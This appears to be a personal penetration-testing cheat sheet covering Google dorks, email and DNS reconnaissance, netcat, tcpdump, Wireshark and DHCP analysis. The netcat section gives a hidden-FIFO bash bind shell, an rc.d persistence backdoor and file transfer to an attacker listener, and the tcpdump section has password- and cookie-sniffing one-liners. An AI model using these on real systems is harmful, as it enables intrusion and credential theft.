# PENETRATION_TEST

```bash
 > "Remember, hacking isn’t a race; it’s a test of will, patience, and preparation"
 > 
 > "follow the white rabbit....."
```

## PASSIVE_IG

### Google_Hacking

1. Files of a certain type on a certain website or domain. The Public Intelligence website provides example below (_Those search parameters return PDF documents on that website’s servers with the string “sensitive but unclassified” anywhere in the document text._)

    ```bash
    “sensitive but unclassified” filetype:pdf site:publicintelligence.net
    ```

1. Returns files located on a particular website or domain

    ```bash
    site:exampleWebOrDomain.net
    ```  
  
1. File extension (without a space) returns files of the specified type, such as DOC, PDF, XLS and INI. Multiple file types can be searched for simultaneously by separating extensions with “|”

    ```bash
    filetype:pdf|doc
    allintext:username filetype:log site:publicintelligence.net
    ```

1. Returns results with that sequence of characters in the URL

    ```bash
    inurl:"password"
    inurl:/proc/self/cwd site:publicintelligence.net
    ```

1. Returns files with the string anywhere in the text

    ```bash
    intext:somethingsomething
    ```

1. Must contains exactly word something

    ```bash
    "something" funny    
    ```

1. Every web contains banana but not loki word

    ```bash
    banana -loki   
    ```  
  
1. Cache for cached page (something like archive.org but not witch their power)

    ```bash
    cache:www.something.pl  
    ```

1. Show web page that have link to my target

    ```bash
    link:www.something.pl  
    ```

1. Show similar web page

    ```bash
    related:www.something.pl  
    ```

1. Show Open FTP servers

    ```bash
    intitle:"index of" inurl:ftp site:publicintelligence.net  
    ```

1. Show SSH private keys
  
    ```bash
    intitle:index.of id_rsa -id_rsa.pub site:publicintelligence.net
    filetype:log username putty site:publicintelligence.net
    ```

1. Show MP3, Movie, and PDF files

    ```bash
    intitle: index of mp3 site:publicintelligence.net
    intitle: index of pdf site:publicintelligence.net
    intext: .mp4 site:publicintelligence.net
    ```

1. Show cameras

    ```bash
    intitle:"Weather Wing WS-2"
    inurl:top.htm inurl:currenttime
    intitle:"webcamXP 5"
    inurl:"lvappl.htm"
    ```

### Email_Harvesting

1. Capture SMTP / POP3 Email

    ```bash
    tcpdump -nn -l port 25 | grep -i 'MAIL FROM\|RCPT TO'
    ```

1. Email lists

    ```bash
    filetype:xls inurl:"email.xls" site:publicintelligence.net
    site:.edu filetype:xls inurl:"email.xls"
    ```

1. Enumeration by SMTP (Simple Mail Transfer Protocol, ports 25 or 587)
   1. I can use metasploit and __auxiliary/scanner/smtp/smtp_version__ for checking.
   1. If results are ok then use __auxiliary/scanner/smtp/smtp_enum__
   1. After that I may also search executable program __smtp-user-enum.pl__
   1. When I run it (__./smtp-user-enum.pl__) I get help options. Example usage are:

    ```bash
    ./smtp-user-enum.pl -M VRFY -U userList.txt -t 192.168.1.120
    ```

1. I can verify LDAP by using SMTP commands in telnet (require by ECC)

    ```bash
    telnet 192.168.1.12
    (Verifying a User Name)
        > S: VRFY Smith
        R: 250 Fred Smith <Smith@USC-ISIF.ARPA> 
        Or
        > S: VRFY Jones
        R: 550 String does not match anything.

    (Expanding a Mailing List)
        > S: EXPN Example-People
        R: 250-Jon Postel <Postel@USC-ISIF.ARPA>
        R: 250-Fred Fonebone <Fonebone@USC-ISIQ.ARPA>
        R: 250-Sam Q. Smith <SQSmith@USC-ISIQ.ARPA>
        R: 250-Quincy Smith <@USC-ISIF.ARPA:Q-Smith@ISI-VAXA.ARPA>
        R: 250- <joe@foo-unix.ARPA>
        R: 250 <xyz@bar-unix.ARPA>
        Or
        > S: EXPN Executive-Washroom-List
        R: 550 Access Denied to You.

    (Verify e-mail address of the recipient)
        > S: EHLO
        (or HELLO depends on a server)
        > S: MAIL FROM: <you@server.com>
        (address with the same domain as the server)
        > S: RCPT TO: <friend@friendsdomain.com>  
        (address to verify)
        R: 250 OK – MAIL FROM <you@yourdomain.com>
        OR
        > S: EHLO
        (or HELLO depends on a server)
        > S: MAIL FROM: <you@server.com>
        (address with the same domain as the server)
        > S: RCPT TO: <friend@friendsdomain.com>  
        (address to verify)
        R: error
        (the e-mail address you are trying to send a message to may be
        blocked or it doesent`exist)
    ```

### Theharvester

1. The objective of this program is to gather emails, subdomains, hosts, employee names, open ports and banners from different public sources like search engines, PGP key servers and SHODAN computer database. A tool for gathering e-mail accounts and subdomain names from public sources.<br>This tool is intended to help Penetration Testers in the early stages of the penetration test in order to understand the customer footprint on the Internet. It is also useful for anyone that wants to know what an attacker can see about their organization.

1. Examples
   1. Search from email addresses from a domain (-d kali.org), limiting the results to 500 (-l 500), using Google (-b google)

    ```bash
    theharvester -d kali.org -l 500 -b google
    ```

   1. Organizations using PGP, such as journalists or anyone sending and receiving encrypted emails, are very easy to find in theHarvester. Below PGP key search in progress locating organizational email addresses.

    ```bash
    theharvester -d eff.org -l 500 -b pgp 
    ```

   1. Full sacan

    ```bash
    theharvester -d eff.org -l 500 -b all
    ```

### Additional_Resource

1. Check web in <https://www.netcraft.com/>
1. If I have an IP address and want to know who it belongs to <http://whois.domaintools.com/>
1. Go to the company web page, for simplicity I can download all and crawl by use of <https://www.httrack.com/> or <https://blackwidow.en.softonic.com/>
<br>__CAUTION!! Some web application data can be deleted in response to an information grab__
1. Go to <https://archive.org/>
1. Go to diferent online resources with google search
1. Linkedin.com, Pipl.com for user information
1. Monster.com, pracuj.pl for job description

## ACTIVE_IG

### Types of records

| Type | Purpose Examples |
|--- | --- |
| A | IPv4 IP address 192.168.1.5 or 75.126.153.206 |
| AAAA | IPv6 IP address 2607:f0d0:1002:51::4 |
| CNAME | Canonical name record (Alias) s0.cyberciti.org is an alias for d2m4hyssawyie7.cloudfront.net |
| MX | Email server host names smtp.cyberciti.biz or mx1.nixcraft.com |
|NS | Name (DNS) server names ns1.cyberciti.biz or ns-243.awsdns-30.com |
| PTR | Pointer to a canonical name. Mostly used for implementing reverse DNS lookups 82.236.125.74.in-addr.arpa |
| SOA | Authoritative information about a DNS zone see below |
| TXT | Text record see below |

### SOA record

1. In the SOA itself, 2013090800 is the serial number, 86400 is the refresh interval, 900 is the retry time, 1209600 is the expiry time, and 3600 defines the TTL for the zone.

| Name |     Function   |     Describe |
| --- | --- | --- |
|SRV  |       Service   |      This record defines the hostname and port number of servers providing specific services, such as a Directory Services servers.|
| SOA  |       Start of    |    This record identifies the primary name server for the zone. Authority The SOA record contains the hostname of the server responsible for all DNS records within the namespace, as well as the basic properties of the domain|
| PTR  |       Pointer  |       This maps an IP address to hostname (providing for reverse DNS lookups) You don`t absolutely need a PTR record for every entry in main DNS namespace, but these are usually associated with e-mail server records|
| NS   |       Name Server  |   This record defines the name servers within my namespace. These servers are the ones that respond to main client`s for name resolution|
| MX |    Mail exchange  | Defines the mail server of a domain|
| CNAME |      Canonical Name | This record provides for domain name aliases within main zone. For example, I may have an FTP service and a web service running on the same IP address. CNAME records could be used to list both within DNS for me|
| A     |      Address    |     This record maps an IP address to a hostname and is used most often for DNS lookups|
| CERT | Certificate | Record for PGP server or similar|
| DHCID | | Defines DHCP server for a domain|
| DNAME |  | Alias for a domain name|
| IPSECKEY ||             Key to use for IPsec|
|RP ||             Responsible person|
|SSHFP||              SSH public key|

### DNS check nslookup

1. To perform a DNS lookup, I cam simply enter the domain or subdomain to query and press enter on your keyboard.
1. The __"set type"__ command will let me query a particular type of DNS record. For example, if I wanted to check the MX (mail) records for a particular domain, I would type the following:

    ```bash
    > set type=mx
    ```

1. I can now perform another lookup on the domain name, and only the MX records will be returned.

1. When I first start NSLookup it will query mine local DNS server. This is likely to be mine router or Internet Service Provider's DNS servers. As a result, I may not also receive accurate results, as the server I query may not exist in mine local DNS server. NSLookup allows me to change the nameserver I query, to ensure I query a nameserver from which I guaranteed to get an accurate result. If I query the nameserver listed against the domain name I will receive an authoritative answer, because the nameserver has authority over the DNS for the domain name.

1. Start by retrieving the nameserver's for the domain name by using the set type command and then querying the domain.

    ```bash
    > set type=ns
    > targetDomain.com
    ```

1. I can see from the results that targetDomain.com has two nameserver's, ns1.livedns.co.uk and ns2.livedns.co.uk. I can now switch NSlookup to query one of those authoritative nameserver's for this domain name.

    ```bash
    > server ns1.livedns.co.uk
    ```

1. Set type is still set to query nameserver records, so change the type back to query the record. I need (for example A record). In this example we shall retrieve the A records for the domain.

    ```bash
    > set type=a
    ```

1. And finally, query the domain name.

    ``` bash
    > targetDomain.com
    ```

### DNS zone transfer

1. Zone transfer differs from a “normal” DNS request in that it pulls every record from the DNS server instead of just the one, or one type, I`m looking for. To use nslookup to perform a zone transfer, first I make sure of connection to the SOA server for the zone and then try the following steps:

    ```bash
    1. Enter nslookup at the command line.
    2. Type server __IPAddress__, using the IP address of the SOA and press __ENTER__
    3. Type set type=any and press __ENTER__
    4. Type ls -d domainname.com and press __ENTER__
    #where domainname.com is the name of the zone
    ```

### dnsrecon command

Basically brute-force common names of hosts via DNS query and based on response from DNS server it identify if the host exist or not. Dnsrecon is a powerful DNS enumeration script, powerd by Kali

1. For lookup

    ```bash
    dnsrecon -d strona.org              
    ```

1. For reverse lookup

    ```bash
    dnsrecon -r 192.168.1.120-192.168.1.139
    ```

1. For zone walking

    ```bash
    dnsrecon -d strona.org -t zonewalk
    ```

1. Scan a domain ("-d example.com"), use a dictionary to brute force hostnames ("-D /usr/share/wordlists/dnsmap.txt"), do a standard scan ("-t std"), and save the output to a file ("–xml dnsrecon.xml")

    ```bash
    dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml
    ```

### host command

1. Use host to find all the host records for a zone:

    ```bash
    host -l domain
    ```

1. Use host to request all the records for a zone:

    ```bash
    host -lv -t any domain
    ```

### Reverse Lookup Bruteforce

1. This method relies on the existence of PTR host records being configured on the organizational nameserver. PTR records are becoming more widely used as many mail systems require PTR verification before accepting mail. Using the host command, I can perform a PTR DNS query on an IP, and if that IP has a PTR record configured, I will receive its FQDN.

    ```bash
    > host 216.200.241.66
    Example response
    66.241.200.216.in-addr.arpa domain name pointer http://www.checkpoint.com
    ```

1. From this result, we see that the IP 216.200.241.69 back resolves to <http://www.checkpoint.com>. Using a bash script, we can automate the backward resolution of all the hosts present on the checkpoint.com IP blocks.

    ```sh
    #!/bin/sh
    echo "Enter Class C IP network range:"
    echo "eg.:194.29.32"
    read range
     for i in $(seq 1 254); do
      host $range.$i | grep "name pointer" | cut -d" " -f5 
     done
    ```

## SCANNING

### netcat command

1. Connecting to a TCP/UDP Port
1. The most basic syntax is __"netcat [options] host port"__
1. To send a UDP packet instead of initiating a TCP connection, I can use the -u option
1. For listening on a TCP/UDP Port, I can use the -l option
1. Transferring Files with Netcat
   1. Create a listener on Mine machine and pipe the traffic from the input into a file

    ```bash
    nc -lvvp 4444 > file_to_download.txt
    
    -l = State that we are going to be listening
    -vv = Show extra verbosity
    -p = We are going to supply a port for listening
    4444 = This is the port will be listening on
    ```

   2. Back on the ssh session on the target machine we are going to transfer the file through netcat to the listening port on our local machine

    ```bash
    nc -nvv 192.168.1.141 4444 < file_to_download.txt
    -n == do not resolve IP address using DNS
    ```

   3. Be aware that netcat will not tell you once the file has finished transferring. It is a good idea to open another shell and do __ls -ls fileToTransfer.csv.enc__ to check when the file has stopped increasing in size.

1. Transfer a whole directory (including its content) from one host to another
   1. On the sender side run first:

    ```bash
    tar cfvz - folderToPass/ | nc -lp 10000
    ```

   2. Second. On the client side run:

    ```bash
    nc [sender ip] 10000 | tar xfvz -
    ```

   3. No info will be printed. But I can check in Wireshark my connection. When I got [PSH, ACK] then
  I can terminate sending file from sender machine

1. Remote Administration with Netcat (Ubuntu Server 18.04)

   1. I don't know how to automate it yet but i can create a reverse shell on a target machine.
  Unfortunately netcat option __-e__ is discarded but with a Ubuntu Server 18.04 I can do something like this:

   1. Server listning and provide a shell (I can use cron but it is veary obvious)

    ```sh
    #!/bin/sh
    rm -f /tmp/.fdata && mkfifo /tmp/.fdata && cat /tmp/.fdata | /bin/bash -i 2>&1 | nc -l [host] [port] > /tmp/.fdata
    ```

   2. From attacking perspective

    ```bash
    nc [host] [port]
    ```

   3. PS Old way working on linux was simple script run from __rc__ directory:

    ```sh
    #!/bin/sh

    #save in /etc/rc.d/rc.ftpp
    mkdir -p /etc/ftp/.data
    while true ; do
    cd /etc/ftp/.data | nc -l -p 1337 -e /bin/sh
    done
    ```

1. Scanning and Enumeration with Netcat (_Pasive banner grabbing_)

    ```bash
    nc [host] 80 --> for system information
    nc [host] 25 --> for mail information
    ```

1. Discovering open ports on a machine

    ```bash
    nc -z -vv -w 1 192.168.1.100 20-25

    -z = Zero-I/O mode, report connection status only
    -vv = Use more than once (-vv, -vvv...) for greater verbosity. With -v it will be verbose and display all kinds of useful connection based information
    -w 1 = wait for 1 sec
    20-25 = port range
    ```

### tcpdump command

1. Program for captures network traffic and prints it out (_PS. Flag [.] means ACK_).
   1. What dns queries is my laptop sending ?

    ```bash
    tcpdump -n -p -i any port 53
    
    -n = do not resolve names
    -p = makes sure I only get packets that are to or from Mine computer   
    -i = chose interface
    ```

   2. I have a server running on port 1337. Are any packets arraiving at that port at ALL ??

    ```bash
    tcpdump -i any port 1337
    ```

   3. What packets are coming into my server (port 1337) from ip 1.2.3.4 ?

    ```bash
    tcpdump port 1337 and host 1.2.3.4  
    ```
  
   4. How long are the TCP connections on this box listing right now ? <br>_Resoult file analyze by WIRESHARK_

    ```bash
    tcpdump -c 10000 -w packets.pcap

    -c = count _only capture 10000 packets in example above_
    -w = writes _write to a .pcap file_
    ```

1. Connection refused error
2. Send a SYN flag

  ```
        12:16:38.944390 IP6 localhost.48680 > localhost.8999: Flags [S]
  1. Server replies with RST ACK. That gets translated to "connection refused"

        ```
        12:16:38.944458 IP6 localhost.8999 > localhost.48680: Flags [R.]
1. BPF filters<br>
    tcpdump uses a small language called BPF to let me filter packets.
 When I run "sudo tcpdump port 53", "port 53" is a BPF filter. Here`s a quick guide.
  1. Command that checks if the source port or the dest port is 53. _Matches TCP port 53 and UDP port 53._

  ```

        port 53

  1. Command that checks if the source or dest IP is 192.168.3.2

  ```

        host 192.168.3.2
  1. I can use "and", "or", and "not"
   host 11.22.33.44 and port 80  
  1. Other BPF filters

  ```

        src port 80
  dest port 80
  tcp port 80
  src host 1.2.3.4
  dest host 1.2.3.4

1. Practical Examples
1. -l (small L) make stdout line buffered. Useful if I want to see the data while capturing it.  E.g.,

     ```
        tcpdump -l | tee dat or tcpdump -l > dat & tail -f dat
1. Extract HTTP User Agents

  ```

        tcpdump -nn -A -s1500 -l | grep "User-Agent:"
  tcpdump -nn -A -s1500 -l | egrep -i 'User-Agent:|Host:'
  1. Capture only HTTP GET

  ```

        tcpdump -s 0 -A -vv 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420'

  1. Capture only HTTP POST

  ```

        tcpdump -s 0 -A -vv 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354'
  1. Extract HTTP Request URL's

  ```

        tcpdump -s 0 -v -n -l | egrep -i "POST /|GET /|Host:"

  1. Extract HTTP Passwords in POST Requests

  ```

        tcpdump -s 0 -A -n -l | egrep -i "POST /|pwd=|passwd=|password=|Host:"
  1. Capture Cookies from Server and from Client

  ```

        tcpdump -nn -A -s0 -l | egrep -i 'Set-Cookie|Host:|Cookie:'

  1. Capture all ICMP packets

  ```

        tcpdump -n icmp
  1. Show ICMP Packets that are not ECHO/REPLY (standard ping)

  ```

        tcpdump 'icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply'

  1. Capture SMTP / POP3 Email

  ```

        tcpdump -nn -l port 25 | grep -i 'MAIL FROM\|RCPT TO'
  1. Troubleshooting NTP Query and Response

  ```

        tcpdump dst port 123

  1. Capture SNMP Query and Response

  ```

        tcpdump -n -s0  port 161 and udp
  1. Capture FTP Credentials and Commands

  ```

        tcpdump -nn -v port ftp or ftp-data

  1. Capture Start and End Packets of every non-local host

  ```

        tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0 and not src and dst net localnet'
  1. Capture DNS Request and Response

  ```

        tcpdump -i wlp58s0 -s0 port 53

  1. Capture HTTP data packets

  ```

        tcpdump 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
  1. Top Hosts by Packets

  ```

        tcpdump -nnn -t -c 200 | cut -f 1,2,3,4 -d '.' | sort | uniq -c | sort -nr | head -n 20

  1. Capture all the plaintext passwords

  ```

        tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -l -A | egrep -i -B5 'ss=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user '
  1. DHCP Example

  ```

        tcpdump -v -n port 67 or 68

  1. Capture with tcpdump and view in Wireshark

  ```

        ssh root@remotesystem 'tcpdump -s0 -c 1000 -nn -w - not port 22' | wireshark -k -i -
        ```

#### <span style="color:green">WIRESHARK</span>

1. "Wireshark can be useful for many different tasks, whether you are a network engineer, security professional or system administrator."
  1. Graph is very useful for analysis
    1. On page <https://hackertarget.com/wireshark-tutorial-and-cheat-sheet/> are some usfule tips
1. To visually understand packet loss I can utilize following filters
  1. Indicates we’ve seen a gap in sequence numbers in the capture.
  Packet loss can lead to duplicate ACKs, which leads to retransmissions.

  ```

        tcp.analysis.lost_segment 

  1. Displays all retransmissions in the capture. A few retransmissions are OK, excessive retransmissions are bad. This usually shows up as slow application performance and/or packet loss to the user.

  ```

        tcp.analysis.retransmission
  1. TCP retransmissions are just one of the many fields that can be used for graphing in troubleshooting scenarios. I can try some of others filters using the same trace file.
  1. HTTP Response times that took more than 400 ms:

      ```
            http.time >= 0.4
    1. TCP ACK that took longer than 50 ms

   ```

            tcp.analysis.rto >= 0.050

1. Examination of Application Layer Sessions. <br>Once you have several packets showing HTTP, select one and then:
    > select Analyze => Follow => HTTP Stream from the drop-down menu.

    This will show you an assembled HTTP session. In this new window, you see the HTTP request from the browser and HTTP response from the web server.
1. I can find Display Filter Reference: Hypertext Transfer Protocol on page: <https://www.wireshark.org/docs/dfref/h/http.html>
1. View Telnet sessions I can simply use a filter _telnet_
1. View SMTP or POP3 traffic I can simplyuse filter _smtp_
 or _pop3_
1. Extract files from PCAP using Export (HTTP or SMB)<br>It is quite easy to extract files from a Wireshark capture using the export option.

 > File => Export Objects => HTTP

    The new Window will show any files that were found. In this new Window I can save the individual files or save them all to a folder. <br>A similar method can be used to extract files from SMB sessions. This is the Microsoft Server Message Block protocol that allows Windows File Sharing.
 > File => Export Objects => SMB

## NOTES

#### <span style="color:green">USEFULL_PORT_TO_REMEMBER</span>

|  Set One      | Set Two              |
|---------------|----------------------|
|   21 = FTP    | 110       = POP3   |
|   22 = SSH    | 137 - 139 = NetBIOS|  
|   23 = Telnet | 143 = IMAP         |
|   25 = SMTP | 161 - 162 = SNMP   |
|   53 = DNS    | 389 = LDAP         |
|   67 = DHCP | 443 = HTTPS        |
|   80 = HTTP | 445 = SMB          |

#### <span style="color:green">NETWORK_CLASSES_IPv4</span>

In 1996, RFC1918 enhanced CIDR with the assignments of reserved, externally non-routable networks in each of the old A (0-127), B (128-191), and C (192-223), class ranges
("W 1996 r. RFC1918 rozszerzył CIDR o przypisania zarezerwowanych, zewnętrznie nierutowalnych sieci w każdym ze starych zakresów klas A, B i C.").

These private networks can be used freely by any organization for their internal networks; no longer is it necessary for every computer to have an assigned public IP address.

|CIDR Block | Address Range |   Number of IP Addresses
|--- | --- | ---|
|10.0.0.0/8 | 10.0.0.0 – 10.255.255.255 | 16,777,216
|172.16.0.0/12 | 172.16.0.0 – 172.31.255.255| 1,048,576
|192.168.0.0/16| 192.168.0.0 – 192.168.255.255| 65,536

__sipcalc = NICE PROGRAM TO CALCULATE NETWORK RANGES__

|commend | explain|
|---|---|
|sipcalc 172.16.0.0/12|    for checking a network
|sipcalc 172.16.0.0/12 -s 16|  for devide network on 16 subnets; -s > /12 on that example

#### <span style="color:green">POWER_SHELL</span>

1. PowerShell File Management:
   <https://blog.netwrix.com/2018/05/17/powershell-file-management/>

1. PowerShell's Execution Policy:<br>
   __Restricted__<br>
    PowerShell won't run any scripts (default execution policy).
       AllSigned.
    PowerShell will only run scripts that are signed with a digital signature.
    If you run a script signed by a publisher PowerShell hasn't seen before, PowerShell
    will ask whether you trust the script's publisher.<br>
   __RemoteSigned__<br>
    PowerShell won't run scripts downloaded from the Internet unless they have
    a digital signature, but scripts not downloaded from the Internet will run without
    prompting. If a script has a digital signature, PowerShell will prompt you before it
    runs a script from a publisher it hasn't seen before.
       Unrestricted.
    PowerShell ignores digital signatures but will still prompt you before running a script
    downloaded from the Internet.

1. Cmd commands under Windows:<br>
   <https://www.digitalcitizen.life/command-prompt-how-use-basic-commands><br>
   <https://www.thomas-krenn.com/en/wiki/Cmd_commands_under_Windows>

#### <span style="color:green">DHCP_ISSUES</span>

1. __Capture DHCP Traffic__
1. Start a Wireshark capture.
1. Open a command prompt.
1. Type ipconfig /renew and press Enter.
1. Type ipconfig /release and press Enter.
1. Type ipconfig /renew and press Enter.
1. Close the command prompt.
1. Stop the Wireshark capture.

1. __Analyze DHCP Request Traffic__
    1. Observe the traffic captured in the top Wireshark packet list pane. To view only DHCP traffic, type:
        > udp.port == 68 (lower case) in the Filter box and press Enter.
    1. In the top Wireshark packet list pane, select the first DHCP packet, labeled DHCP Request.
    1. Observe the packet details in the middle Wireshark packet details pane. Notice that it is an Ethernet II / Internet Protocol Version 4 / User Datagram Protocol / Bootstrap Protocol frame.
    1. Expand Ethernet II to view Ethernet details.
    1. Observe the Destination and Source fields. The destination should be your DHCP server's MAC address and the source should be your MAC address. To confirm You can use:
        > ipconfig /all <br>and<br> arp -a
    1. Expand Internet Protocol Version 4 to view IP details.
    1. Observe the Source address. Notice that the source address is your IP address.
    1. Observe the Destination address. Notice that the destination address is the IP address of the DHCP server.
    1. Expand User Datagram Protocol to view UDP details.
    1. Observe the Source port. Notice that it is bootpc (68), the BOOTP client port.
    1. Observe the Destination port. Notice that it is bootps (67), the BOOTP server port.
    1. Expand Bootstrap Protocol to view BOOTP details.
    1. Observe the DHCP Message Type. Notice that it is a Request (3).
    1. Observe the Client IP address, Client MAC address, and DHCP option fields. This is the request to the DHCP server.
1. __Analyze DHCP ACK Traffic__
    1. In the top Wireshark packet list pane, select the second DHCP packet, labeled DHCP ACK.
    1. Observe the packet details in the middle Wireshark packet details pane. Notice that it is an Ethernet II / Internet Protocol Version 4 / User Datagram Protocol / Bootstrap Protocol frame.
    1. Expand Ethernet II to view Ethernet details.
    1. Observe the Destination and Source fields. The destination should be your MAC address and the source should be your DHCP server's MAC address.
    1. Expand Internet Protocol Version 4 to view IP details.
    1. Observe the Source address. Notice that the source address is the DHCP server IP address.
    1. Observe the Destination address. Notice that the destination address is your IP address.
    1. Expand User Datagram Protocol to view UDP details.
    1. Observe the Source port. Notice that it is bootps (67), the BOOTP server port.
    1. Observe the Destination port. Notice that it is bootpc (68), the BOOTP client port.
    1. Expand Bootstrap Protocol to view BOOTP details.
    1. Observe the DHCP Message Type. Notice that it is an ACK (5).
    1. Observe the Client IP address and Client MAC address fields. This is the acknowledgement from the DHCP server.
    1. Observe the DHCP options and expand to view the details for IP Address Lease Time, Subnet Mask, Router (Default Gateway), Domain Name Server, and Domain Name, as well as any other options if included.
  
1. __Analyze DHCP Release Traffic__
    1. In the top Wireshark packet list pane, select the third DHCP packet, labeled DHCP Release.
    1. Observe the packet details in the middle Wireshark packet details pane. Notice that it is an Ethernet II / Internet Protocol Version 4 / User Datagram Protocol / Bootstrap Protocol frame.
    1. Expand Ethernet II to view Ethernet details.
    1. Observe the Destination and Source fields. The destination should be your DHCP server's MAC address and the source should be your MAC address. To confirm You can use:
        > ipconfig /all <br>and<br> arp -a
    1. Expand Internet Protocol Version 4 to view IP details.
    1. Observe the Source address. Notice that the source address is your IP address.
    1. Observe the Destination address. Notice that the destination address is the IP address of the DHCP server.
    1. Expand User Datagram Protocol to view UDP details.
    1. Observe the Source port. Notice that it is bootpc (67), the BOOTP client port.
    1. Observe the Destination port. Notice that it is bootps (68), the BOOTP server port.
    1. Expand Bootstrap Protocol to view BOOTP details.
    1. Observe the DHCP Message Type. Notice that it is a Release (7).
    1. Observe the Client IP address and Client MAC address fields. This is the address that will be released on the DHCP server.
  
1. __Analyze DHCP Discover Traffic__
1. In the top Wireshark packet list pane, select the fourth DHCP packet, labeled DHCP Discover.
1. Observe the packet details in the middle Wireshark packet details pane. Notice that it is an Ethernet II / Internet Protocol Version 4 / User Datagram Protocol / Bootstrap Protocol frame.
1. Expand Ethernet II to view Ethernet details.
1. Observe the Destination and Source fields. The destination should be the broadcast address ff:ff:ff:ff:ff:ff and the source should be your MAC address. When the client doesn't have an IP address or server information, it has to broadcast to discover a DHCP server.
1. Expand Internet Protocol Version 4 to view IP details.
1. Observe the Source address. Notice that the source address is 0.0.0.0, indicating no current IP address.
1. Observe the Destination address. Notice that the destination address 255.255.255.255, the broadcast IP address.
1. Expand User Datagram Protocol to view UDP details.
1. Observe the Source port. Notice that it is bootpc (68), the BOOTP client port.
1. Observe the Destination port. Notice that it is bootps (67), the BOOTP server port.
1. Expand Bootstrap Protocol to view BOOTP details.
1. Observe the DHCP Message Type. Notice that it is a Discover (1).
1. Observe the Client IP address, Client MAC address, and DHCP option fields. This is the request to the DHCP server.

1. __Analyze DHCP Offer Traffic__
1. In the top Wireshark packet list pane, select the fifth DHCP packet, labeled DHCP Offer.
1. Observe the packet details in the middle Wireshark packet details pane. Notice that it is an Ethernet II / Internet Protocol Version 4 / User Datagram Protocol / Bootstrap Protocol frame.
1. Expand Ethernet II to view Ethernet details.
1. Observe the Destination and Source fields. The destination should be your MAC address and the source should be your DHCP server's MAC address.
1. Expand Internet Protocol Version 4 to view IP details.
1. Observe the Source address. Notice that the source address is the DHCP server's IP address.
1. Observe the Destination address. Notice that the destination address is 255.255.255.255 (broadcast) address.
1. Expand User Datagram Protocol to view UDP details.
1. Observe the Source port. Notice that it is bootps (67), the BOOTP server port.
1. Observe the Destination port. Notice that it is bootpc (68), the BOOTP client port.
1. Expand Bootstrap Protocol to view BOOTP details.
1. Observe the DHCP Message Type. Notice that it is an Offer (2).
1. Observe the Client IP address and Client MAC address fields. This is the offer from the DHCP server.
1. Observe the DHCP options and expand to view the details for IP Address Lease Time, Subnet Mask, Router (Default Gateway), Domain Name Server, and Domain Name, as well as any other options if included.

1. __Analyze DHCP Request Traffic__
    1. In the top Wireshark packet list pane, select the sixth DHCP packet, labeled DHCP Request.
    1. Observe the packet details in the middle Wireshark packet details pane. Notice that it is an Ethernet II / Internet Protocol Version 4 / User Datagram Protocol / Bootstrap Protocol frame.
    1. Expand Ethernet II to view Ethernet details.
    1. Observe the Destination and Source fields. The destination should be the broadcast address ff:ff:ff:ff:ff:ff and the source should be your MAC address. When the client doesn't have an IP address or server information, it has to broadcast to request an address lease.
    1. Expand Internet Protocol Version 4 to view IP details.
    1. Observe the Source address. Notice that the source address is 0.0.0.0, indicating no current IP address.
    1. Observe the Destination address. Notice that the destination address 255.255.255.255, the broadcast IP address.
    1. Expand User Datagram Protocol to view UDP details.
    1. Observe the Source port. Notice that it is bootpc (68), the BOOTP client port.
    1. Observe the Destination port. Notice that it is bootps (67), the BOOTP server port.
    1. Expand Bootstrap Protocol to view BOOTP details.
    1. Observe the DHCP Message Type. Notice that it is a Request (3).
    1. Observe the Client IP address, Client MAC address, and DHCP option fields. This is the request to the DHCP server.

1. __Analyze DHCP ACK Traffic__
    1. In the top Wireshark packet list pane, select the seventh DHCP packet, labeled DHCP ACK.
    1. Observe the packet details in the middle Wireshark packet details pane. Notice that it is an Ethernet II / Internet Protocol Version 4 / User Datagram Protocol / Bootstrap Protocol frame.
    1. Expand Ethernet II to view Ethernet details.
    1. Observe the Destination and Source fields. The destination should be your MAC address and the source should be your DHCP server's MAC address.
    1. Expand Internet Protocol Version 4 to view IP details.
    1. Observe the Source address. Notice that the source address is the DHCP server IP address.
    1. Observe the Destination address. Notice that the destination address is the broadcast address 255.255.255.255.
    1. Expand User Datagram Protocol to view UDP details.
    1. Observe the Source port. Notice that it is bootps (67), the BOOTP server port.
    1. Observe the Destination port. Notice that it is bootpc (68), the BOOTP client port.
    1. Expand Bootstrap Protocol to view BOOTP details.
    1. Observe the DHCP Message Type. Notice that it is an ACK (5).
    1. Observe the Client IP address and Client MAC address fields. This is the acknowledgement from the DHCP server.
    1. Observe the DHCP options and expand to view the details for IP Address Lease Time, Subnet Mask, Router (Default Gateway), Domain Name Server, and Domain Name, as well as any other options if included.
    1. Close Wireshark to complete this activity. Quit without Saving to discard the captured traffic.

#### <span style="color:green">NETWORK_RANGE</span>

Go to below authorities and check IP of a target website (there will be ranges provided, of course, main target operates in their own IP range)

1. American Registry for Internet Numbers (ARIN)
1. Asia-Pacific Network Information Center (APNIC)
1. Réseaux IP Européens NCC (RIPE Network Coordination Centre)
1. Latin America and Caribbean Network Information Center (LACNIC)
1. African Network Information Center (AfriNIC)
